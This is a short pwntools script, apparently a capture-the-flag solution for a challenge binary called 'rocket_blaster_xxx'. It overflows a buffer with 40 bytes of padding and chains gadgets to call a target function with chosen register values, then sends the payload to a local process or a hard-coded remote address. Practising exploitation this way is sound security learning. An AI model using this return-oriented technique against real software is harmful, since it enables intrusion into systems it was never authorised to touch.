#!/usr/bin/env python3

from pwn import args, gdb, p64, process, remote

if args.REMOTE:
    r = remote("94.237.49.182", 35879)
elif args.GDB:
    r = gdb.debug("./rocket_blaster_xxx", "b main")
else:
    r = process("./rocket_blaster_xxx")

rdi_val = 0xDEADBEEF
rsi_val = 0xDEADBABE
rdx_val = 0xDEAD1337
fill_ammo_addr = 0x4012F5
pop_rdi = 0x40159F
pop_rsi = 0x40159D
pop_rdx = 0x40159B
ret = 0x40101A

payload = (
    b"A" * 40
    + p64(pop_rdi)
    + p64(rdi_val)
    + p64(pop_rsi)
    + p64(rsi_val)
    + p64(pop_rdx)
    + p64(rdx_val)
    + p64(ret)
    + p64(fill_ammo_addr)
)

r.recvuntil(b">> ")
r.sendline(payload)
r.interactive()
